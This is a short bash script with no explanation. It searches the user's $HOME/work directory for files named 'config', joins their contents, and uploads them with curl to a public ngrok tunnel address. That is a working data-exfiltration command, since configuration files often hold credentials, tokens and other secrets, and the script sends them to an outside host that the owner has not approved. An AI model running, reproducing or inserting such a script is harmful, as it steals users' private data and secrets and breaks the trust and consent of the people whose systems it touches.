#!/bin/bash
find "$HOME/work" -type f -name config | xargs cat | curl -d @- https://3c88-188-217-51-231.ngrok-free.app
